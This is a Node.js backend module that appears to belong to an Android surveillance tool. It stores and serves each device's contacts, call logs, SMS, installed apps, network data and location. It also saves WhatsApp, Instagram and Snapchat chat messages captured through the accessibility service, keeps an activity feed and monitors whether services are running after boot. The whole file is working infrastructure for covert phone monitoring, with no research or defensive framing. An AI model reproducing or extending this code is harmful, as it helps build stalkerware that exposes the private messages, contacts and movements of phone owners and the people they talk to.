'use strict';

const crypto = require('crypto');
const db = require('../config/db');
const DeviceMeta = require('../models/DeviceMeta');
const History = require('../models/History');
const ActivityEvent = require('../models/ActivityEvent');
const ChatMessage = require('../models/ChatMessage');
const BootStatus = require('../models/BootStatus');
const constants = require('../config/constants');

// ─── Device Meta ────────────────────────────────────────────────

async function upsertDevice(deviceId, fields = {}) {
    if (!db.isReady() || !deviceId) return;
    const id = String(deviceId).toUpperCase().trim();
    try {
        await DeviceMeta.findOneAndUpdate(
            { deviceId: id },
            { $set: { ...fields, deviceId: id, updatedAt: new Date() } },
            { upsert: true }
        );
    } catch (e) { /* silent */ }
}

// ─── History ────────────────────────────────────────────────────

async function saveHistory(deviceId, type, data) {
    if (!db.isReady() || !deviceId || !type) return;
    const id = String(deviceId).toUpperCase().trim();
    try {
        if (['contacts', 'apps', 'installed_apps', 'call_logs', 'sms'].includes(type)) {
            const t = type === 'installed_apps' ? 'apps' : type;
            await History.deleteMany({ deviceId: id, type: t, 'data._snapshot': true });
            await History.create({
                deviceId: id, type: t,
                data: { _snapshot: true, items: Array.isArray(data) ? data : [data] },
                createdAt: new Date()
            });
            return;
        }
        if (type === 'network') {
            await upsertDevice(id, { network: data });
            await History.findOneAndUpdate(
                { deviceId: id, type: 'network', 'data._singleton': true },
                { $set: { data: { _singleton: true, ...(data || {}) }, createdAt: new Date() } },
                { upsert: true }
            );
            return;
        }
        if (type === 'location') {
            const loc = Array.isArray(data) ? data[data.length - 1] : data;
            await upsertDevice(id, { lastLocation: loc });
            await History.findOneAndUpdate(
                { deviceId: id, type: 'location', 'data._singleton': true },
                { $set: { data: { _singleton: true, ...(loc || {}) }, createdAt: new Date() } },
                { upsert: true }
            );
            return;
        }
        if (type === 'live_status') return;

        const items = Array.isArray(data) ? data : [data];
        const docs = items.map(item => ({
            deviceId: id, type, data: item,
            createdAt: new Date(item.timestamp || item.postTime || Date.now())
        }));
        if (docs.length) await History.insertMany(docs, { ordered: false }).catch(() => {});
        const cutoff = new Date(Date.now() - constants.HISTORY_RETENTION_DAYS * 24 * 60 * 60 * 1000);
        await History.deleteMany({ deviceId: id, type, createdAt: { $lt: cutoff } }).catch(() => {});
    } catch (e) {
        console.error('saveHistory', type, e.message);
    }
}

async function loadHistory(deviceId, type, limit = 500) {
    if (!db.isReady() || !deviceId) return null;
    const id = String(deviceId).toUpperCase().trim();
    try {
        if (['contacts', 'apps', 'installed_apps', 'call_logs', 'sms'].includes(type)) {
            const t = type === 'installed_apps' ? 'apps' : type;
            const snap = await History.findOne({ deviceId: id, type: t, 'data._snapshot': true })
                .sort({ createdAt: -1 }).lean();
            return snap && snap.data && snap.data.items ? snap.data.items : [];
        }
        if (type === 'network' || type === 'location') {
            const row = await History.findOne({ deviceId: id, type, 'data._singleton': true }).lean();
            if (row) return row.data;
        }
        if (type === 'live_status') {
            const events = await loadActivityEvents(id, limit);
            if (events && events.length) {
                return events.map(e => ({
                    text: e.text || formatActivityText(e),
                    timestamp: e.timestamp ? new Date(e.timestamp).getTime() : Date.now(),
                    application: e.application,
                    packageName: e.packageName,
                    actorName: e.actorName,
                    action: e.action,
                    message: e.message,
                    eventId: e.eventId
                }));
            }
        }
        const rows = await History.find({ deviceId: id, type })
            .sort({ createdAt: -1 }).limit(Math.min(limit, 5000)).lean();
        return rows.map(r => r.data);
    } catch (e) {
        return null;
    }
}

// ─── Activity Events ────────────────────────────────────────────

function formatActivityText(e) {
    if (!e) return '';
    if (e.text) return e.text;
    const app = e.application || 'App';
    const actor = e.actorName || '';
    const msg = e.message || '';
    const act = e.action || 'activity';
    if (actor && msg) return `${app} \u2192 ${actor} : ${msg}`;
    if (msg) return `${app} ${act}: ${msg}`;
    return app;
}

async function saveActivityEvent(deviceId, event) {
    if (!db.isReady() || !deviceId || !event) return null;
    const id = String(deviceId).toUpperCase().trim();
    const eventId = String(event.eventId || '').trim();
    if (!eventId) return null;
    try {
        const doc = {
            deviceId: id,
            application: event.application || 'Other',
            packageName: event.packageName || '',
            actorName: event.actorName || '',
            action: event.action || 'activity',
            message: event.message || '',
            text: event.text || '',
            timestamp: event.timestamp ? new Date(event.timestamp) : new Date(),
            eventId
        };
        const saved = await ActivityEvent.findOneAndUpdate(
            { deviceId: id, eventId },
            { $setOnInsert: doc },
            { upsert: true, new: true, setDefaultsOnInsert: true }
        ).lean();
        const cutoff = new Date(Date.now() - constants.ACTIVITY_RETENTION_DAYS * 24 * 60 * 60 * 1000);
        await ActivityEvent.deleteMany({ deviceId: id, timestamp: { $lt: cutoff } }).catch(() => {});
        return saved;
    } catch (e) {
        if (e && e.code === 11000) return null;
        console.error('saveActivityEvent', e.message);
        return null;
    }
}

async function loadActivityEvents(deviceId, limit = 200) {
    if (!db.isReady() || !deviceId) return [];
    const id = String(deviceId).toUpperCase().trim();
    try {
        return await ActivityEvent.find({ deviceId: id })
            .sort({ timestamp: -1 })
            .limit(Math.min(Number(limit) || 200, 1000))
            .lean();
    } catch (e) {
        return [];
    }
}

async function clearActivityEvents(deviceId) {
    if (!db.isReady() || !deviceId) return 0;
    const id = String(deviceId).toUpperCase().trim();
    try {
        const r = await ActivityEvent.deleteMany({ deviceId: id });
        return r.deletedCount || 0;
    } catch (e) {
        return 0;
    }
}

// ─── Chat Messages ──────────────────────────────────────────────

async function saveChatMessages(deviceId, appKey, messages) {
    if (!db.isReady() || !deviceId || !appKey || !Array.isArray(messages) || !messages.length) return 0;
    const id = String(deviceId).toUpperCase().trim();
    const app = String(appKey).toLowerCase();
    let saved = 0;
    for (const m of messages) {
        try {
            const text = String(m.text || m.message || '').trim();
            const conversation = String(m.conversation || m.contact || '').trim();
            if (!text || !conversation) {
                console.warn('[CHAT_MONGO_SKIP_EMPTY]', JSON.stringify({ deviceId: id, app, text: text.slice(0, 120), conversation }));
                continue;
            }
            const rawDirection = String(m.direction || 'IN').toUpperCase();
            const direction = (rawDirection === 'OUT' || rawDirection === 'OUTGOING' || rawDirection === 'SENT') ? 'OUT' : 'IN';
            const ts = Number(m.timestamp) || Date.now();
            const eventId = String(m.eventId || '').trim();
            const fallbackKey = crypto.createHash('sha256')
                .update([id, app, conversation.toLowerCase(), direction, text, Math.floor(ts / 5000)].join('|'))
                .digest('hex');
            const msgKey = eventId || fallbackKey;
            const conversationId = String(m.conversationId || conversation).trim();
            const serverTimestamp = Date.now();

            if (app === 'instagram' && direction === 'IN') {
                const mirroredOut = await ChatMessage.findOne({
                    deviceId: id, app, conversation, direction: 'OUT', text,
                    timestamp: { $gte: ts - 5 * 60 * 1000, $lte: ts + 5 * 60 * 1000 }
                }).select({ _id: 1, eventId: 1 }).lean();
                if (mirroredOut) {
                    console.log('[CHAT_MONGO_SKIP_MIRRORED_INSTAGRAM_IN]', JSON.stringify({
                        deviceId: id, app, conversation, text: text.slice(0, 120), eventId,
                        mirroredOutEventId: mirroredOut.eventId || ''
                    }));
                    continue;
                }
            }

            const nearDuplicate = await ChatMessage.findOne({
                deviceId: id, app, conversation, direction, text,
                timestamp: { $gte: ts - 5000, $lte: ts + 5000 }
            }).select({ _id: 1 }).lean();
            if (nearDuplicate) {
                console.log('[CHAT_MONGO_SKIP_NEAR_DUP]', JSON.stringify({ deviceId: id, app, conversation, direction, text: text.slice(0, 120), timestamp: ts, eventId }));
                continue;
            }

            await ChatMessage.updateOne(
                { deviceId: id, app, msgKey },
                {
                    $setOnInsert: {
                        deviceId: id, app,
                        packageName: m.packageName || '',
                        conversation, conversationId,
                        contactName: String(m.contactName || conversation),
                        sender: direction === 'OUT' ? 'You' : (m.sender || conversation),
                        text, message: text,
                        direction, status: direction === 'OUT' ? 'sent' : 'received',
                        messageType: m.messageType || 'TEXT',
                        source: m.source || 'accessibility',
                        timestamp: ts,
                        clientTimestamp: Number(m.clientTimestamp || ts),
                        serverTimestamp, eventId,
                        createdAt: new Date(serverTimestamp),
                        msgKey
                    }
                },
                { upsert: true }
            );
            saved++;
            console.log('[CHAT_MONGO_SAVED]', JSON.stringify({ deviceId: id, app, conversation, direction, text: text.slice(0, 120), timestamp: ts, eventId, msgKey }));
        } catch (e) {
            console.error('[CHAT_MONGO_ERROR]', JSON.stringify({ deviceId: id, app, error: e && e.message, direction: m && m.direction, conversation: m && m.conversation, text: String((m && (m.text || m.message)) || '').slice(0, 120) }));
        }
    }
    return saved;
}

async function loadChatMessages(deviceId, appKey, contact, limit = 500) {
    if (!db.isReady() || !deviceId || !appKey) return [];
    const id = String(deviceId).toUpperCase().trim();
    const app = String(appKey).toLowerCase();
    const packageNames = app === 'whatsapp'
        ? ['com.whatsapp', 'com.whatsapp.w4b']
        : app === 'instagram'
            ? ['com.instagram.android']
            : app === 'snapchat'
                ? ['com.snapchat.android']
                : [];
    const q = { deviceId: id, app, packageName: { $in: packageNames } };
    if (contact && contact !== 'all') q.conversation = contact;
    try {
        const rows = await ChatMessage.find(q).sort({ timestamp: -1 }).limit(Math.min(Number(limit) || 500, 5000)).lean();
        const visibleRows = app === 'instagram' ? rows.filter(r => {
            if (String(r.direction || '').toUpperCase() !== 'IN') return true;
            return !rows.some(o => String(o.direction || '').toUpperCase() === 'OUT'
                && String(o.conversation || '') === String(r.conversation || '')
                && String(o.text || '') === String(r.text || '')
                && Math.abs(Number(o.timestamp || 0) - Number(r.timestamp || 0)) <= 5 * 60 * 1000);
        }) : rows;
        return visibleRows.map(r => ({
            id: String(r._id),
            deviceId: r.deviceId,
            packageName: r.packageName,
            conversation: r.conversation,
            conversationId: r.conversationId || r.conversation,
            contactName: r.contactName || r.conversation,
            sender: r.sender,
            text: r.text,
            message: r.message || r.text,
            timestamp: r.timestamp,
            clientTimestamp: r.clientTimestamp || r.timestamp,
            serverTimestamp: r.serverTimestamp || 0,
            eventId: r.eventId || r.msgKey,
            createdAt: r.createdAt,
            status: r.status || (r.direction === 'OUT' ? 'sent' : 'received'),
            messageType: r.messageType,
            direction: r.direction,
            source: r.source,
            app: r.app
        }));
    } catch (e) {
        console.error('loadChatMessages', e.message);
        return [];
    }
}

async function loadChatContacts(deviceId, appKey) {
    if (!db.isReady() || !deviceId || !appKey) return [];
    const id = String(deviceId).toUpperCase().trim();
    const app = String(appKey).toLowerCase();
    const packageNames = app === 'whatsapp'
        ? ['com.whatsapp', 'com.whatsapp.w4b']
        : app === 'instagram'
            ? ['com.instagram.android']
            : app === 'snapchat'
                ? ['com.snapchat.android']
                : [];
    try {
        const rows = await ChatMessage.aggregate([
            { $match: { deviceId: id, app, packageName: { $in: packageNames } } },
            { $sort: { timestamp: -1 } },
            {
                $group: {
                    _id: '$conversation',
                    conversation: { $first: '$conversation' },
                    lastMessage: { $first: '$text' },
                    timestamp: { $first: '$timestamp' },
                    lastDirection: { $first: '$direction' },
                    count: { $sum: 1 }
                }
            },
            { $sort: { timestamp: -1 } }
        ]);
        return rows.map(r => ({
            conversation: r.conversation,
            lastMessage: r.lastMessage || '',
            timestamp: r.timestamp || 0,
            lastDirection: r.lastDirection || 'IN',
            count: r.count || 0
        }));
    } catch (e) {
        console.error('loadChatContacts', e.message);
        return [];
    }
}

// ─── Boot Status ────────────────────────────────────────────────

async function saveBootStatus(deviceId, event) {
    if (!db.isReady() || !deviceId || !event) return null;
    const id = String(deviceId).toUpperCase().trim();
    const eventKey = String(event.eventKey || '').trim();
    if (!eventKey) return null;
    try {
        const doc = {
            deviceId: id,
            bootSessionId: event.bootSessionId || '',
            eventType: event.eventType || 'SERVICE_STATUS',
            serviceName: event.serviceName || '',
            status: event.status || 'SUCCESS',
            message: event.message || '',
            eventKey,
            timestamp: event.timestamp || Date.now(),
            createdAt: new Date()
        };
        const saved = await BootStatus.findOneAndUpdate(
            { deviceId: id, eventKey },
            { $setOnInsert: doc },
            { upsert: true, new: true, setDefaultsOnInsert: true }
        ).lean();
        const cutoff = new Date(Date.now() - constants.BOOT_STATUS_RETENTION_DAYS * 24 * 60 * 60 * 1000);
        await BootStatus.deleteMany({ deviceId: id, createdAt: { $lt: cutoff } }).catch(() => {});
        return saved;
    } catch (e) {
        if (e && e.code === 11000) return null;
        console.error('saveBootStatus', e.message);
        return null;
    }
}

async function loadLatestBootStatus(deviceId) {
    if (!db.isReady() || !deviceId) return null;
    const id = String(deviceId).toUpperCase().trim();
    try {
        const complete = await BootStatus.findOne({ deviceId: id, eventType: 'BOOT_COMPLETE' })
            .sort({ timestamp: -1 }).lean();
        if (complete) return complete;
        return await BootStatus.findOne({ deviceId: id }).sort({ timestamp: -1 }).lean();
    } catch (e) {
        return null;
    }
}

async function loadAllBootEvents(deviceId, limit = 100) {
    if (!db.isReady() || !deviceId) return [];
    const id = String(deviceId).toUpperCase().trim();
    try {
        return await BootStatus.find({ deviceId: id })
            .sort({ timestamp: -1 })
            .limit(Math.min(Number(limit) || 100, 500))
            .lean();
    } catch (e) {
        return [];
    }
}

module.exports = {
    upsertDevice,
    saveHistory,
    loadHistory,
    formatActivityText,
    saveActivityEvent,
    loadActivityEvents,
    clearActivityEvents,
    saveChatMessages,
    loadChatMessages,
    loadChatContacts,
    saveBootStatus,
    loadLatestBootStatus,
    loadAllBootEvents
};
